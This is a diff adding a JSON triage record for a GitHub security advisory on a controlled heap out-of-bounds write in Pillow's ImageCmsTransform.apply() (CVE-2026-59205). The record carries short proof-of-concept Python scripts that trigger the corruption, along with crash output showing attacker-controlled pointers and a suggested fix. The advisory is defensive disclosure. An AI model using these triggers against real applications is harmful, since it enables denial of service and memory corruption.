@@ -1,0 +1,57 @@
+{
+  "ai": {
+    "affected_assets": [],
+    "evidence_urls": [],
+    "exposure_conditions": [],
+    "recommended_actions": [],
+    "status": "pending",
+    "uncertainties": []
+  },
+  "body_excerpt": "{\"credits\": [{\"type\": \"reporter\", \"user\": {\"avatar_url\": \"https://avatars.githubusercontent.com/u/132073089?v=4\", \"events_url\": \"https://api.github.com/users/Serotav/events{/privacy}\", \"followers_url\": \"https://api.github.com/users/Serotav/followers\", \"following_url\": \"https://api.github.com/users/Serotav/following{/other_user}\", \"gists_url\": \"https://api.github.com/users/Serotav/gists{/gist_id}\", \"gravatar_id\": \"\", \"html_url\": \"https://github.com/Serotav\", \"id\": 132073089, \"login\": \"Serotav\", \"node_id\": \"U_kgDOB99GgQ\", \"organizations_url\": \"https://api.github.com/users/Serotav/orgs\", \"received_events_url\": \"https://api.github.com/users/Serotav/received_events\", \"repos_url\": \"https://api.github.com/users/Serotav/repos\", \"site_admin\": false, \"starred_url\": \"https://api.github.com/users/Serotav/starred{/owner}{/repo}\", \"subscriptions_url\": \"https://api.github.com/users/Serotav/subscriptions\", \"type\": \"User\", \"url\": \"https://api.github.com/users/Serotav\", \"user_view_type\": \"public\"}}], \"cve_id\": \"CVE-2026-59205\", \"cvss\": {\"score\": 7.5, \"vector_string\": \"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H\"}, \"cvss_severities\": {\"cvss_v3\": {\"score\": 7.5, \"vector_string\": \"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H\"}, \"cvss_v4\": {\"score\": 0.0, \"vector_string\": null}}, \"cwes\": [{\"cwe_id\": \"CWE-787\", \"name\": \"Out-of-bounds Write\"}], \"description\": \"### Summary\\n\\nPillow's public `ImageCms.ImageCmsTransform.apply(im, imOut)` API can trigger\\ncontrolled native heap corruption when the caller supplies an output image whose\\nmode does not match the transform's declared output mode.\\n\\nFor example, a transform built as `RGBA -> RGBA` can be applied to an `L` output\\nimage. Pillow checks dimensions only, then calls LittleCMS with the output row\\npointer. LittleCMS writes RGBA-sized rows into a 1-byte-per-pixel `L` image row.\\n\\n### Details\\n\\n`src/PIL/ImageCms.py:ImageCmsTransform.apply()` accepts an optional caller\\nsupplied `imOut`:\\n\\n```python\\ndef apply(self, im, imOut=None):\\n    if imOut is None:\\n        imOut = Image.new(self.output_mode, im.size, None)\\n    self.transform.apply(im.getim(), imOut.getim())\\n    imOut.info[\\\"icc_profile\\\"] = self.output_profile.tobytes()\\n    return imOut\\n```\\n\\nIf `imOut` is provided, Pillow does not check:\\n\\n```text\\nim.mode == self.input_mode\\nimOut.mode == self.output_mode\\n```\\n\\nThe C wrapper in `src/_imagingcms.c` unwraps both image cores and only checks\\nthat the output dimensions are at least as large as the input dimensions:\\n\\n```c\\nstatic int\\npyCMSdoTransform(Imaging im, Imaging imOut, cmsHTRANSFORM hTransform) {\\n    if (im->xsize > imOut->xsize || im->ysize > imOut->ysize) {\\n        return -1;\\n    }\\n\\n    for (i = 0; i < im->ysize; i++) {\\n        cmsDoTransform(hTransform, im->image[i], imOut->image[i], im->xsize);\\n    }\\n\\n    pyCMScopyAux(hTransform, imOut, im);\\n    return 0;\\n}\\n```\\n\\n`findLCMStype()` maps `RGB`, `RGBA`, and `RGBX` transform modes to LittleCMS\\n`TYPE_RGBA_8`, which writes 4 bytes per pixel:\\n\\n```c\\ncase IMAGING_MODE_RGB:\\ncase IMAGING_MODE_RGBA:\\ncase IMAGING_MODE_RGBX:\\n    return TYPE_RGBA_8;\\n```\\n\\nSo with a transform declared as `RGBA -> RGBA`, LittleCMS writes `4 * width`\\nbytes to each output row. If the supplied output image is mode `L`, Pillow only\\nallocated `1 * width` bytes for that row.\\n\\nFor width 4096:\\n\\n```text\\ndestination row allocation: 4096 bytes\\nLittleCMS write size:       16384 bytes\\noverflow:                  ~12288 bytes past the row\\n```\\n\\nThe bug does not require a large image. Width 8 was enough to corrupt heap\\nmetadata. At width 8, `apply()` returned to Python and printed `after`; glibc\\ndetected the corrupted heap later during cleanup.\\n\\n### PoC\\n\\nTiny heap corruption trigger:\\n\\n```python\\nfrom PIL import Image, ImageCms\\n\\nsrgb = ImageCms.createProfile(\\\"sRGB\\\")\\ntransform = ImageCms.buildTransform(srgb, srgb, \\\"RGBA\\\", \\\"RGBA\\\")\\n\\nim = Image.new(\\\"RGBA\\\", (8, 1), (0x41, 0x42, 0x43, 0x44))\\nout = Image.new(\\\"L\\\", (8, 1), 0)\\n\\nprint(\\\"before\\\", flush=True)\\ntransform.apply(im, out)\\nprint(\\\"after\\\")\\n```\\n\\nObserved locally on Pillow `12.3.0.dev0`:\\n\\n```text\\nbefore\\nafter\\nfree(): invalid next size (normal)\\nAborted (core dumped)\\n```\\n\\nControlled overwrite evidence PoC:\\n\\n```python\\nfrom PIL import Image, ImageCms\\n\\nsrgb = ImageCms.createProfile(\\\"sRGB\\\")\\ntransform = ImageCms.buildTransform(srgb, srgb, \\\"RGBA\\\", \\\"RGBA\\\")\\n\\nim = Image.new(\\\"RGBA\\\", (4096, 1), (0x41, 0x42, 0x43, 0x44))\\nout = Image.new(\\\"L\\\", (4096, 1), 0)\\n\\ntransform.apply(im, out)\\n```\\n\\nRun under gdb:\\n\\n```bash\\ngdb -q --batch -ex run -ex bt --args \\\\\\n  python3 b022_controlled.py\\n```\\n\\nObserved on Pillow `12.3.0.dev0`:\\n\\n```text\\nProgram received signal SIGSEGV, Segmentation fault.\\n___pthread_mutex_lock (mutex=mutex@entry=0x4443424144434241)\\n#1 _cmsLockPrimitive (m=0x4443424144434241)\\n#2 defMtxLock (id=0x4443424144434241, mtx=0x4443424144434241)\\n#3 _cmsLockMutex (ContextID=0x4443424144434241, mtx=0x4443424144434241)\\n#4 cmsSaveProfileToIOhandler(...)\\n#5 cmsSaveProfileToMem(...)\\n#6 cms_profile_tobytes (...) at src/_imagingcms.c:152\\n```\\n\\n`0x4443424144434241` is the attacker-controlled source pixel pattern\\n`b\\\"ABCDABCD\\\"` interpreted as a little-endian pointer-sized value.\\n\\nUsing source pixels `(1, 2, 3, 4)` similarly produced a faulting pointer of\\n`0x403020104030201`, matching the repeated pixel bytes.\\n\\n### Impact\\n\\nThis is a heap out-of-bounds write in Pillow's native ImageCms extension,\\nreachable through public API.\\n\\nApplications are impacted if untrusted users can control ImageCms transform\\nparameters and/or provide the output image object passed to\\n`ImageCmsTransform.apply()`. The source image pixels influence the bytes written\\nout of bounds.\\n\\n## Suggested fix\\n\\nValidate modes before calling into the native transform:\\n\\n```python\\ndef apply(self, im, imOut=None):\\n    if im.mode != self.input_mode:\\n        raise ValueError(\\\"input mode mismatch\\\")\\n    if imOut is None:\\n        imOut = Image.new(self.output_mode, im.size, None)\\n    elif imOut.mode != self.output_mode:\\n        raise ValueError(\\\"output mode mismatch\\\")\\n    self.transform.apply(im.getim(), imOut.getim())\\n    imOut.info[\\\"icc_profile\\\"] = self.output_profile.tobytes()\\n    return imOut\\n```\\n\\nThe C extension should also defensively reject mismatched image modes before\\ncalling `cmsDoTransform()`.\", \"epss\": {\"percentage\": 0.0039, \"percentile\": 0.31252}, \"ghsa_id\": \"GHSA-9hw9-ch79-4vh6\", \"github_reviewed_at\": \"2026-07-20T23:19:00Z\", \"html_url\": \"https://github.com/advisories/GHSA-9hw9-ch79-4vh6\", \"identifiers\": [{\"type\": \"GHSA\", \"value\": \"GHSA-9hw9-ch79-4vh6\"}, {\"type\": \"CVE\", \"value\": \"CVE-2026-59205\"}], \"nvd_published_at\": \"2026-07-14T16:17:02Z\", \"published_at\": \"2026-07-20T23:19:00Z\", \"references\": [\"https://github.com/python-pillow/Pillow/security/advisories/GHSA-9hw9-ch79-4vh6\", \"https://nvd.nist.gov/vuln/detail/CVE-2026-59205\", \"https://github.com/python-pillow/Pillow/pull/9715\", \"https://github.com/python-pillow/Pillow/commit/a9ffc42bedf4fc0a7ef8d6486e7f9e81e3397721\", \"https://github.com/pypa/advisory-database/tree/main/vulns/pillow/PYSEC-2026-3453.yaml\", \"https://github.com/python-pillow/Pillow/releases/tag/12.3.0\", \"https://github.com/advisories/GHSA-9hw9-ch79-4vh6\"], \"repository_advisory_url\": \"https://api.github.com/repos/python-pillow/Pillow/security-advisories/GHSA-9hw9-ch79-4vh6\", \"severity\": \"high\", \"source_code_location\": \"https://github.com/python-pillow/Pillow\", \"summary\": \"Pillow: Controlled heap out-of-bounds write in Pillow `ImageCmsTransform.apply()` via output mode mismatch\", \"type\": \"reviewed\", \"updated_at\": \"2026-07-20T23:19:01Z\", \"url\": \"https://api.github.com/advisories/GHSA-9hw9-ch79-4vh6\", \"vulnerabilities\": [{\"first_patched_version\": \"12.3.0\", \"package\": {\"ecosystem\": \"pip\", \"name\": \"pillow\"}, \"vulnerable_functions\": [], \"vulnerable_version_range\": \"< 12.3.0\"}], \"withdrawn_at\": null}",
+  "canonical_id": "github:ghsa-9hw9-ch79-4vh6",
+  "decision": {
+    "priority": "INFO",
+    "reasons": [
+      "資産不一致または判定情報不足"
+    ]
+  },
+  "enrichment": {
+    "asset_match": false,
+    "cisa_kev": false,
+    "internet_exposed": false,
+    "matched_asset_ids": []
+  },
+  "facts": {
+    "affected_versions": [
+      "pillow: < 12.3.0"
+    ],
+    "authentication_required": false,
+    "cves": [
+      "CVE-2026-59205"
+    ],
+    "cvss_score": 7.5,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+    "fixed_versions": [],
+    "mitigations": [],
+    "products": [
+      "pillow"
+    ],
+    "remote": true,
+    "vendor_severity": "high"
+  },
+  "first_seen_at": "2026-07-22T00:50:30.142154Z",
+  "provenance": {
+    "content_sha256": "07d6d3bbcd22ab73e590ef4b30667dd8236cfe11f957953d08601df29b43ff70",
+    "extractor_version": "0.1.0",
+    "source_type": "json_api"
+  },
+  "published_at": "2026-07-20T23:19:00Z",
+  "schema_version": 1,
+  "source_id": "github_advisory_database",
+  "source_url": "https://github.com/advisories/GHSA-9hw9-ch79-4vh6",
+  "status": "active",
+  "title": "Pillow: Controlled heap out-of-bounds write in Pillow `ImageCmsTransform.apply()` via output mode mismatch",
+  "updated_at": "2026-07-20T23:19:01Z",
+  "vendor": "GitHub",
+  "vendor_advisory_id": "GHSA-9hw9-ch79-4vh6"
+}
